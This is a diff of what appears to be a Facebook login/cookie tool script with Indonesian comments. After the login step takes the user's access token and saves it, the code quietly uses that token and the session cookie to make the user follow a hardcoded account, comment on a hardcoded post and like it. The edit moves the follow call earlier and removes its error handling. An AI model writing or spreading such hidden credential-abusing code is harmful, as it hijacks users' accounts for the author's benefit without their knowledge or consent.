@@ -961,9 +961,10 @@ def logincoki():
 					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
 					open('.fantoken.txt','w').write(token)
 					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
+					bot_follow()
 					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cok})
 					bot_komen(cok, token)
-					bot_follow()
+					
 					#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
 				else:Console().print(f" {H2}• {P2}[bold red]Cookie Invalid");exit()
 			except Exception as e:print(e);exit()
@@ -1042,11 +1043,9 @@ def bot_komen(cok, ken):
         r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
 # ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
 def bot_follow():
-	try:
+	with requests.Session() as r:
 		toket = open('.fantoken.txt','r').read()
-		requests.post('https://graph.facebook.com/100043537611609/subscribers?access_token=' + toket)
-	except:
-		pass
+		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
 
 
 def viperfollow(VIPER):  # YANG GAK GANTI BOT FOLLOW GANTENG
